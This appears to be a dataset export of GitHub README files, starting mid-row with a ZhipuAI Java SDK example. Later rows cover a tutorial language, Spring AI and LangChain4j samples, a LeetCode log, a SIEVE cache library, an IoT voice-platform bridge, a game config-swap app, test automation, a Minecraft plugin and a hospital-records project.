import java.util.concurrent.TimeUnit;

@RestController
public class TestController {

    private final static Logger logger = LoggerFactory.getLogger(TestController.class);
    private static final String API_SECRET_KEY = System.getProperty(""ZHIPUAI_API_KEY"");

    private static final ClientV4 client = new ClientV4.Builder(API_SECRET_KEY)
            .networkConfig(300, 100, 100, 100, TimeUnit.SECONDS)
            .connectionPool(new okhttp3.ConnectionPool(8, 1, TimeUnit.SECONDS))
            .build();
    private static final ObjectMapper mapper = MessageDeserializeFactory.defaultObjectMapper();


    @RequestMapping(""/test"")
    public R<ModelData> test(@RequestBody ChatCompletionRequest chatCompletionRequest) {
        ModelApiResponse sseModelApiResp = client.invokeModelApi(chatCompletionRequest);

        return R.ok(sseModelApiResp.getData());
    }
}

```


## 升级内容

#### release-V4-2.3.0
- 知识库业务
- 智能助手业务
- 增加embedding-3支持

#### release-V4-2.2.0
- 重构代码
- 高级检索接口
- codegeex接口
- 视频生成功能


#### release-V4-2.1.0
- 增加拓展报文序列化工具类
- 增加测试样例
- 修改为使用api key鉴权
- 统一通信客户端
- 删除部分序列化框架依赖
- 增加批处理API

#### release-V4-2.0.2
- readTimeOut时间设置为300s
- 修改测试demo中apiKey命名


#### release-V4-2.0.1
- 统一client4构造apikey入参
- 延长token过期时间
",0,5,11,MIT
ArtyomKingmang/Tulang,master,"<div align=""center"">
  <img src=""icon.png"" width=""250"">
</div>

## More about project
Compiled programming language for tutorial. 

>Main platform - jvm


Fibonacci in tulang:
```rust
fn fibonacci(n) {
  if(n < 2) {
    return n
  }
  return fibonacci(n - 1) + fibonacci(n - 2)
}

println(fibonacci(10))

```


List example:
```js
let testList = list()

list_append(testList, 20)
list_append(testList, 10)

print(testList) //[20, 10]
```

",0,0,1,
habuma/spring-ai-examples,main,"# Spring AI Examples

This repository is where I'll commit various examples of using Spring AI.

You can clone this project in its entirety and work with it like that. *Or*
better, use the [SpringCLI](https://docs.spring.io/spring-cli/reference/index.html)
to select individual projects and create them locally.

This repository includes a project-catalog.yml, so you can add it as a project
catalog to Spring CLI like this:

```
% spring project-catalog add spring-ai-examples https://github.com/habuma/spring-ai-examples
```

Then you will be able to see these projects when using `spring project list` and
be able to create projects locally using `spring boot new`. For example, to
create a new local copy of the ""prompts-and-output-parsers"" example, do this:

```
% spring boot new my-project output-parsers com.example.ai
```

This will create the project in a directory named ""my-project"" and will refactor
the package names to be `com.example.ai`.

You can also mix a project's functionality into an existing project by using
`spring boot add`. For example, let's say you already have a Spring Boot project
and want to add the functionality of the ""prompts-and-output-parsers"" project to
it. Here's how you would do that:

```
% spring boot add output-parsers
```

Be aware, however, that the Spring AI examples may build against newer versions
of Spring Boot than your project. If so, your project's original Boot version
will remain unchanged and you may get build or test errors. You'll need to
update your Boot version to the version of the example project to fix the build.

Also note that the project catalog includes one example that is maintained in
separate Git repositories:

- [SpeechAI](https://github.com/habuma/speechai)

Because they're in the project catalog, you can use the Spring CLI to create
those projects as well.

## Want more?

If you like this repository of example, then you're going to love [Spring AI in
Action](https://www.manning.com/books/spring-ai-in-action?a_aid=habuma&a_bid=f205d999&chan=habuma),
now available in Manning's Early Access Program (MEAP). It covers all aspects of
working with Spring AI with a fun example that runs throughout most of the book. 

![Spring AI in Action](https://www.habuma.com/img/SAIiA_small.png ""Spring AI in Action"")
",0,1,2,
SarthakChaudhary46/100-Days-Of-CODE,main,"![image](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/assets/86872379/5f77bd48-2373-45c5-a3f8-9118e244fc7a)
                               
                                           MY #100DaysOfCode Journey ( LeetCode )

#### Day 1 - [Two Sum](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%201) 
#### Day 2 - [Add Digits](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%202)
#### Day 3 - [Determine if Two Strings Are Close](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%203)
#### Day 4 - [Find Players With Zero or One Losses](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%204)
#### Day 5 - [Insert Delete GetRandom O(1)](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%205)
#### Day 6 - [Unique Number of Occurrences](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%206)
#### Day 7 - [Climbing Stairs](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%207)
#### Day 8 - [Minimum Falling Path Sum](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%208)
#### Day 9 - [Sum of Subarray Minimums](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%209)
#### Day 10 - [House Robber](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2010)
#### Day 11 - [Set Mismatch](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2011)
#### Day 12 - [Maximum Length of a Concatenated String with Unique Characters](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2012)
#### Day 13 - [Pseudo-Palindromic Paths in a Binary Tree](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2013)
#### Day 14 - [Longest Common Subsequence](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2014)
#### Day 15 - [Out of Boundary Paths](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2015)
#### Day 16 - [K Inverse Pairs Array](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2016)
#### Day 17 - [Number of Submatrices That Sum to Target](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2017)
#### Day 18 - [Implement Queue using Stacks](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2018)
#### Day 19 - [Evaluate Reverse Polish Notation](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2019)
#### Day 20 - [Daily Temperatures](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2020)
#### Day 21 - [Divide Array Into Arrays With Max Difference](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2021)
#### Day 22 - [Sequential Digits](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2022)
#### Day 23 - [Partition Array for Maximum Sum](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2023)
#### Day 24 - [Minimum Window Substring](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2024)
#### Day 25 - [First Unique Character in a String](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2025)
#### Day 26 - [Group Anagrams](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2026)
#### Day 27 - [Sort Characters By Frequency](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2027)
#### Day 28 - [Perfect Squares](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2028)
#### Day 29 - [Largest Divisible Subset](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2029)
#### Day 30 - [Palindromic Substrings](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2030)
#### Day 31 - [Cherry Pickup II](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2031)
#### Day 32 - [Majority Element](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2032)
#### Day 33 - [Find First Palindromic String in the Array](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2033)
#### Day 34 - [Rearrange Array Elements by Sign](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2034)
#### Day 35 - [Find Polygon With the Largest Perimeter](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2035)
#### Day 36 - [Least Number of Unique Integers after K Removals](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2036)
#### Day 37 - [Furthest Building You Can Reach](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2037)
#### Day 38 - [Meeting Rooms III](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2038)
#### Day 39 - [Power of Two](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2039)
#### Day 40 - [Missing Number](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2040)
#### Day 41 - [Bitwise AND of Numbers Range](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2041)
#### Day 42 - [Find the Town Judge](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2042)
#### Day 43 - [Cheapest Flights Within K Stops](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2043)
#### Day 44 - [Find All People With Secret](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2044)
#### Day 45 - [Greatest Common Divisor Traversal](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2045)
#### Day 46 - [Same Tree](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2046)
#### Day 47 - [Diameter of Binary Tree](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2047)
#### Day 48 - [Create Find Bottom Left Tree Value](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2048)
#### Day 49 - [Even Odd Tree](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2049)
#### Day 50 - [Maximum Odd Binary Number](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2050)
#### Day 51 - [Squares of a Sorted Array](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2051)
#### Day 52 - [Remove Nth Node From End of List](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2052)
#### Day 53 - [Bag of Tokens](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2053)
#### Day 54 - [Minimum Length of String After Deleting Similar Ends](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2054)
#### Day 55 - [Linked List Cycle](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2055)
#### Day 56 - [Middle of the Linked List](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2056)
#### Day 57 - [Count Elements With Maximum Frequency](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2057)
#### Day 58 - [Minimum Common Value](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2058)
#### Day 59 - [Intersection of Two Arrays](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2059)
#### Day 60 - [Custom Sort String](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2060)
#### Day 61 - [Remove Zero Sum Consecutive Nodes from Linked List](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2061)
#### Day 62 - [Find the Pivot Integer](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2062)
#### Day 63 - [Binary Subarrays With Sum](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2063)
#### Day 64 - [Product of Array Except Self](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2064)
#### Day 65 - [Contiguous Array](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2065)
#### Day 66 - [Insert Interval](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2066)
#### Day 67 - [Minimum Number of Arrows to Burst Balloons](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2067)
#### Day 68 - [Task Scheduler](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2068)
#### Day 69 - [Merge In Between Linked Lists](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2069)
#### Day 70 - [Reverse Linked List](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2070)
#### Day 71 - [Palindrome Linked List](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2071)
#### Day 72 - [Reorder List](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2072)
#### Day 73 - [Find the Duplicate Number](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2073)
#### Day 74 - [Find All Duplicates in an Array](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2074)
#### Day 75 - [First Missing Positive](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2075)
#### Day 76 - [Subarray Product Less Than K](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2076)
#### Day 77 - [Length of Longest Subarray With at Most K Frequency](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2077)
#### Day 78 - [Count Subarrays Where Max Element Appears at Least K Times](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2078)
#### Day 79 - [Subarrays with K Different Integers](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2079)
#### Day 80 - [Count Subarrays With Fixed Bounds](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2080)
#### Day 81 - [Length of Last Word](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2081)
#### Day 82 - [Isomorphic Strings](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2082)
#### Day 83 - [Word Search](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2083)
#### Day 84 - [Maximum Nesting Depth of the Parentheses](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2084)
#### Day 85 - [Make The String Great](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2085)
#### Day 86 - [Minimum Remove to Make Valid Parentheses](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2086)
#### Day 87 - [Valid Parenthesis String](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2087)
#### Day 88 - [Number of Students Unable to Eat Lunch](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2088)
#### Day 89 - [Time Needed to Buy Tickets](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2089)
#### Day 90 - [Reveal Cards In Increasing Order](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2090)
#### Day 91 - [Remove K Digits](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2091)
#### Day 92 - [Trapping Rain Water](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2092)
#### Day 93 - [Maximal Rectangle](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2093)
#### Day 94 - [Sum of Left Leaves](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2094)
#### Day 95 - [Sum Root to Leaf Numbers](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2095)
#### Day 96 - [Add One Row to Tree](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2096)
#### Day 97 - [Smallest String Starting From Leaf](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2097)
#### Day 98 - [Island Perimeter](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2098)
#### Day 99 - [Number of Islands](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%2099)
#### Day 100 - [Number of Islands](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%20100)
#### Day 101 - [Open the Lock](https://github.com/SarthakChaudhary46/100-Days-Of-CODE/tree/main/Day%20101)
",0,0,1,
linux-china/sieve-cache,main,"SIEVE Cache in Java
===================

SIEVE is simpler than LRU with following features:

* Simplicity: easy to implement and can be easily integrated into existing systems.
* Efficiency: achieves state-of-the-art efficiency on skewed workloads.
* Cache Primitive: facilitates the design of advanced eviction algorithms.

![How it works](how-it-works.png)

# Get started
 
* Add dependency to `pom.xml`:

```xml
<dependency>
    <groupId>org.mvnsearch</groupId>
    <artifactId>sieve-cache</artifactId>
    <version>0.1.0</version>
</dependency>
```
* Create a cache instance and use it:

```
   Cache<String> cache = new SieveCache<>();
   cache.put(""nick"", ""Jackie"");
   System.out.println(cache.get(""nick""));
```

# References
        
* SIEVE: https://cachemon.github.io/SIEVE-website/
* SIEVE is simpler than LRU: https://cachemon.github.io/SIEVE-website/blog/2023/12/17/sieve-is-simpler-than-lru/",1,1,1,Apache-2.0
LeYunone/cloud-to-cloud,master,"# Cloud-to-Cloud(云云接入)

## 前言

测试网站：

配置说明：[https://leyunone.com/github-project/voice-cloud-cloud-config.html](https://leyunone.com/github-project/voice-cloud-cloud-config.html)

- 注：学习测试以及使用请拉取 master 分支，release 是开发分支，如果有帮助到你，感谢不留情面的提Issues或pull吐槽
- 开源不易，点个 star 鼓励一下吧！

## 简介

`问：这是什么？`

**答**：对接各大产商云如**小度**、**天猫精灵**，**小爱同学**，**Alexa**等智能语音技能的云云接入协议，是一个全平台通用的中间层物联网设备模型转化平台。

`问：有什么用？`

**答**：

1. 自带完整体系的小度、小米、Alexa、Google等主流物联网平台云云接入协议，拆箱即用
2. 产商云与开发者云的模型转化被数据库配置化，可由页面进行可视化配置他方云模型与我方云模型的转化关系。
3. 是物联网云云接入协议技能平台的一个完整（从架构功能，授权到可视化页面）流程的解决方案

`问：定位是什么？`

**答**：以天猫精灵官网的结构图为例：

![](https://leyunone-img.oss-cn-hangzhou.aliyuncs.com/image/2024-01-17/e2446cf2-1c5f-4ef7-bc43-5105acbe636d.png)

本项目平台介于`天猫精灵`到`第三方设备控制云`之间，将本该由开发云进行控制协议、发现协议等设备交互的云云协议转化，全权由本项目平台进行全平台通用的可配置模式的转化

`问：怎么用？`

**答：** 下载代码，运行数据库文件，各使用者根据自身情况修改一个类中的代码。部署项目，打开前后端不分离的配置页面，配置各平台中开发云与产商云设备模型转化。

## 流程与架构图

云云接入协议流程如下：

![](https://leyunone-img.oss-cn-hangzhou.aliyuncs.com/image/2024-01-18/38e77e82-d415-4b63-ad7c-1b37810d6515.png)

本平台 = 产商云技能

以设备控制为例，简单的流程是：

1. 用户语音触发三方平台，以下以发起 `打开空调` 为例
2. 三方平台根据 `打开空调` 找到对应设备，将设备id与 `打开空调` 动作通过HTTP接口调用的方式，转递给产商云
3. 产商云根据 `控制设备` 指令协议进行接口对接，将其消耗至内部云服务中，进行实施的设备控制



云云接入的核心也将围绕着将对方模型转换为我方模型这一理念进行设计，大致架构图为：

![](https://leyunone-img.oss-cn-hangzhou.aliyuncs.com/image/2024-01-18/1d5540e7-8e5a-4415-895b-f61f5a111e2e.png)

## 平台部署与代码调整

部署环境：

|    环境     |  版本  |
| :---------: | :----: |
|     JDK     |   8    |
|    Mysql    |  不限  |
|    Redis    |  不限  |
|  Rabbitmq   |  不限  |
| Google-auth | 1.19.0 |

数据库见voice_cloud.sql文件

### 以下选读

因为各开发云的业务不同，本平台一定得由使用者进行一定的代码调整，下面将以百度为例进行代码跟踪；

入口：`PortalController`

```java
	@PostMapping(""baidu"")
    public String baidu(@RequestBody String payload) {
        return thirdPartyPortalService.portal(payload, ThirdPartyCloudEnum.BAIDU);
    }
```

使用策略模式走到 `BaiduCloudHandler`中

该类中进行如下动作

1. 刷新产商云在平台的token
2. 检查场景类特殊设备
3. 调用协议执行方法

以百度的发现设备报文为例：

```json
{
    ""header"": {
        ""namespace"": ""DuerOS.ConnectedHome.Discovery"",
        ""name"": ""DiscoverAppliancesRequest"",
        ""messageId"": ""6d6d6e14-8aee-473e-8c24-0d31ff9c17a2"",
        ""payloadVersion"": ""1""
    },
    ""payload"": {
        ""accessToken"": ""[OAuth Token here]"",
        ""openUid"": ""27a7d83c2d3cfbad5d387cd35f3ca17b""
    }
}
```

执行`BaiduDeviceDiscoveryHandler`类方法

使用者在`DeviceServiceHttpManager`中修改我方云实际发现设备动作的请求，一般为HTTP，也可使用Rpc。

调用修改后的方法拿到设备后，将发现到的设备与本次请求的用户关系存储到数据库中，并且在缓存中建立设备-用户的关系文档

执行`BaiduDeviceConvert`模型转化方法，将发现到的设备通过数据库中配置的模型属性映射关系，变为百度方的设备结构；

组装响应参，返回，结束；

架构大体上使用策略+抽象工厂的模式搭建，通过上述的路线查看代码，只需要修改`DeviceServiceHttpManager`中实际云通讯部分的代码即可完成部署；

**包括上报、同步、协议对接部分的所有开发云的响应参请以本项目中的DeviceInfo和DeviceFunctionDTO为准**

## 相关链接

 * 小度  [https://dueros.baidu.com/didp/doc/dueros-bot-platform/dbp-smart-home/protocol/discovery-message_markdown](https://dueros.baidu.com/didp/doc/dueros-bot-platform/dbp-smart-home/protocol/discovery-message_markdown)
 * 小爱同学 [https://developers.xiaoai.mi.com/documents/Home?type=/api/doc/render_markdown/SkillAccess/skill/CustomSkillsMain](https://developers.xiaoai.mi.com/documents/Home?type=/api/doc/render_markdown/SkillAccess/skill/CustomSkillsMain)
 * 华为HiLink  [https://developer.huawei.com/consumer/cn/doc/smarthome-Guides/yunaccount-0000001075288087](https://developer.huawei.com/consumer/cn/doc/smarthome-Guides/yunaccount-0000001075288087)

 * 天猫精灵  [https://www.aligenie.com/doc/357554/cmhq2c](https://www.aligenie.com/doc/357554/cmhq2c)
 * Alexa [https://developer.amazon.com/en-US/docs/alexa/device-apis/alexa-discovery.html](https://developer.amazon.com/en-US/docs/alexa/device-apis/alexa-discovery.html)

 * Google [https://developers.home.google.com/cloud-to-cloud/integration/sync?hl=zh-cn](https://developers.home.google.com/cloud-to-cloud/integration/sync?hl=zh-cn)
 * [物联网语音云云接入](https://leyunone.com/unidentified-business/iot-cloud-cloud.html)
 * [云云对接协议中的值组装](https://leyunone.com/Interesting-design/value-assemble.html)



",0,1,4,
ThomasVitale/llm-apps-java-langchain4j,main,"# LLM Applications with Java, Spring Boot, and LangChain4j

Samples showing how to build Java applications powered by Generative AI and LLMs
using the [LangChain4j Spring Boot](https://github.com/ThomasVitale/langchain4j-spring-boot) extension.

## Pre-Requisites

* Java 17+
* Docker/Podman
* [OpenAI](http://platform.openai.com) API Key (optional)
* [Ollama](https://ollama.ai) (optional)

## Content

### 1. Chat Models

| Project                                                                                                                   | Description                           |
|---------------------------------------------------------------------------------------------------------------------------|---------------------------------------|
| [chat-models-ollama](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/01-chat-models/chat-models-ollama) | Text generation with LLMs via Ollama. |
| [chat-models-openai](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/01-chat-models/chat-models-openai) | Text generation with LLMs via OpenAI. |

### 2. Prompts

| Project                                                                                                                            | Description                                                         |
|------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------|
| [prompts-basics-ollama](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/02-prompts/prompts-basics-ollama)        | Prompting using simple text with LLMs via Ollama.                   |
| [prompts-basics-openai](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/02-prompts/prompts-basics-openai)        | Prompting using simple text with LLMs via OpenAI.                   |
| [prompts-messages-ollama](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/02-prompts/prompts-messages-ollama)    | Prompting using structured messages and roles with LLMs via Ollama. |
| [prompts-messages-openai](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/02-prompts/prompts-messages-openai)    | Prompting using structured messages and roles with LLMs via OpenAI. |
| [prompts-templates-ollama](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/02-prompts/prompts-templates-ollama)  | Prompting using templates with LLMs via Ollama.                     |
| [prompts-templates-openai](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/02-prompts/prompts-templates-openai)  | Prompting using templates with LLMs via OpenAI.                     |

### 3. Output Parsers

| Project                                                                                                                            | Description                                                                  |
|------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------|
| [output-parsers-ollama](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/03-output-parsers/output-parsers-ollama) | Parsing the LLM output as structured objects (Beans, Map, List) via Ollama.  |
| [output-parsers-openai](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/03-output-parsers/output-parsers-openai) | Parsing the LLM output as structured objects (Beans, Map, List) via Open AI. |

### 4. Embedding Models

| Project                                                                                                                                    | Description                                              |
|--------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------|
| [embedding-models-ollama](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/04-embedding-models/embedding-models-ollama) | Vector transformation (embeddings) with LLMs via Ollama. |
| [embedding-models-openai](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/04-embedding-models/embedding-models-openai)   | Vector transformation (embeddings) with LLMs via OpenAI. |

### 5. Document Readers

_Coming soon_

### 6. Document Transformers

_Coming soon_

### 7. Document Writers

_Coming soon_

### 8. Vector Stores

_Coming soon_

### 9. Tools

_Coming soon_

### 10. Image Models

_Coming soon_

## References and Additional Resources

* [LangChain4j](https://github.com/langchain4j)
",0,0,1,Apache-2.0
yxzwym/BlueArchiveUncensored,master,"# 蔚蓝档案反和谐

作用仅仅是帮你替换 LocalizeConfig.txt 而已，和你手动在文件管理器替换没有任何区别

之所以做这个APP，是为了方便懒人

~~不是所有手机都有能修改 /sdcard/Android/data/ 目录的文件管理器，而且可能会忘记包名和需要修改的地方~~

用这个 APP 点一下按钮就行，反和谐完了之后就可以卸载掉了，并不会影响游戏运行

替换完成之后，重启游戏，应该要下载 130MB 左右的数据包。可能会卡在初始化资源，多等一会儿就好

支持安卓版本 5.0 ~ 14，自己试过 5.0 和 7.1 和 14，其他的应该都没问题",1,0,1,
GizaSystems/AutomationExercisePractice,master,"This is a practical software test automation project that demonstrates a real test automation project as part of the team's practice and training program.

# Project Details:
## Main Framework used:
* [SHAFT_Engine](https://github.com/ShaftHQ/SHAFT_ENGINE) <br><img height=""100"" title=""SHAFT_Engine"" src=""https://github.com/ShaftHQ/SHAFT_ENGINE/blob/main/src/main/resources/images/shaft.png"">
## Demo Website used:
* [Automation Exercise](https://automationexercise.com/test_cases) <br><img title=""Automation Exercise"" src=""https://automationexercise.com/static/images/home/logo.png"">
## Project Design:
* Page Object Model (POM) design pattern.
* Fluent design approach (method chaining) for better test cases readability.
* Implement the Test Automation Pyramid strategy by automating on two different test automation levels (Services and GUI layers) on applicable cases.
* Data Driven framework (store data on JSON files).

## Extras:
* Apply CI/CD pipeline workflows using GitHub Actions to be triggered
  * When a PR is created
  * On daily basis
  * On demand
  * On different platforms/operating systems and browsers
![image](https://github.com/MahmoudElSharkawyGS/AutomationExercisePractice/assets/46620469/e76e1a73-54fb-4481-8ebb-a531cb64fa7e)
![image](https://github.com/MahmoudElSharkawyGS/AutomationExercisePractice/assets/46620469/d930a064-2c50-471f-b2fe-4fd31ac4c791)
![image](https://github.com/MahmoudElSharkawyGS/AutomationExercisePractice/assets/46620469/eebbb070-b2c1-4f9b-b9ae-5fc48b60f542)
* Use Github Projects to check status and progress of automting the test cases.
![image](https://github.com/MahmoudElSharkawyGS/AutomationExercisePractice/assets/46620469/76bff439-b320-4893-bc30-fd9378e2b0cd)
![image](https://github.com/MahmoudElSharkawyGS/AutomationExercisePractice/assets/46620469/1e68e591-ca83-4a71-b2df-20112a7e4110)
![image](https://github.com/MahmoudElSharkawyGS/AutomationExercisePractice/assets/46620469/95acc5d1-57e0-4b0b-b083-78de1e56e368)
* Apply best practices.
* Conduct code review sessions on all open and merged pull requests (PRs).

# About [Giza Systems](https://gizasystems.com/):
Giza Systems, a leading digital transformation enabler and systems integrator in the MEA region, designs and deploys industry-specific technology solutions for asset-intensive industries such as the Telecoms, Utilities, Oil & Gas, Transportation and other market sectors. Giza Systems helps its clients streamline their operations and businesses through their portfolio of solutions, managed services, and consultancy practice. Giza Systems’ team of over 2,000 professionals are spread throughout the region with anchor offices in Cairo, Riyadh, Dubai, Doha, Nairobi, Dar-es-Salaam, Abuja, Kampala,and New Jersey, allowing the Company to service an ever-increasing client base in over 40 countries.

<img title=""Giza Systems"" src=""https://gizasystems.com/img/logo.png"">
",0,0,1,
xyzbtw/StashMoverPlugin,main,"# Main branch is 1.20.6.
Change it in gradle.properties, refresh gradle, and build to have another version of mc.


## On both accounts
Set the chamber pos using *stashmover chamber 
(look at the trapdoor when executing command)

Mover
--------

Set a pearl in the same stasis chamber.

Set pearlchest right next to stasis chamber using *stashmover pearlchest

Set the chest where it's going to put everything into. Using *stashmover lootchest
(it should have hoppers under it to go into other chests)

Set water position (just stand in the water) using *stashmover water

Set chamber position using *stashmover chamber

/kill and enable the module at the place where you're moving it FROM

Video instructions (outdated):
https://youtu.be/gfnNFyRQavA

Testing videos
https://youtu.be/nOMEOkEV7NI
https://youtu.be/H-vNh98iq1Y


# IMPORTANT
Disable AutoRespawn on all clients.
Disable ExtraChat/Betterchat on all clients.
Maybe Sprint as it can mess with rotations.

# Optional
You can set a custom load message on both accounts, which they will send/check.
default is ""LOAD PEARL""
you can change it to something random like ijlhfsd

# Have an extra pearl set just in case please



",5,1,1,
YuLin-Coder/No153HospitalMedicalRecord,master,"<p><h1 align=""center"">153.医院病历管理系统</h1></p>

<p> 获取sql文件 QQ: 386869957 QQ群: 377586148 </p>
<p> [更多源码项目: 从戎源码网](https://armycodes.com/) </p>

## 简介

> 本代码来源于网络,仅供学习参考使用!
>
> 提供1.远程部署/2.修改代码/3.设计文档指导/4.框架代码讲解等服务
